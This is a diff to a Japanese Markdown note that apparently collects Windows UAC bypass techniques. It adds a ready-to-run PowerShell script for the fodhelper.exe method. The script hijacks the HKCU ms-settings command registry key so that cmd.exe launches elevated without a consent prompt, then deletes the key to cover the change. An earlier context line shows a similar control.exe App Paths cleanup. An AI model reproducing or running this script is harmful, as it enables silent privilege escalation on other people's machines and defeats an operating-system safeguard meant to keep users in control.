@@ -69,3 +69,20 @@ Windows 8～10の場合：「バックアップと復元」(sdclt.exe)を利用�
     Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\App 
     Paths\control.exe" -Recurse -Force
 ```
+
+#### 手順(win10 fodhelper.exe)
+
+* fodhelper.exe
+
+``` ps
+    # default
+    [String]$program = "C:\Windows\System32\cmd.exe"
+    # Creata Registory Structure
+    New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
+    New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
+    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $program -Force
+    # Start fodhelper.exe
+    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
+    # CleanUp
+    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
+```
